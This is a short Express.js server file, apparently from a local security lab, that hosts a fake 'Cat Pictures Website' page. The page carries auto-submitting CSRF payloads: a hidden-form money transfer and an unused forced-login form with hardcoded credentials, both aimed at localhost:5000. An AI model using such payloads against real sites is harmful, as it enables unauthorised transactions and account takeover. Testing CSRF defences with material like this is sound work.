import express from 'express';

const app = express();
const PORT = 8000;

// used to test CSRF attacks

app.get('/', (req, res) => {
    const transferCsrf = `
        <html>

            <body>
                <h1>Welcome to the Cat Pictures Website</h1>
                <form action="http://localhost:5000/transfer" method="POST">
                    <input type="hidden" name="amount" value="100" />
                    <input type="hidden" name="from" value="100" />
                    <input type="hidden" name="to" value="998" />
                </form>
                <script>
                    document.forms[0].submit();
                </script>
            </body>

        </html>`

        const loginCsrf = `
            <html>

                <body>
                    <h1>Welcome to the Cat Pictures Website</h1>
                    <form action="http://localhost:5000/login" method="POST">
                        <input type="hidden" name="email" value="bob@example.com" />
                        <input type="hidden" name="password" value="123456" />
                    </form>
                    <script>
                        document.forms[0].submit();
                    </script>
                </body>

            </html>
        `

    res.send(transferCsrf);
});

app.listen(PORT, () => {
    console.log(`Listening on port ${PORT}`);
});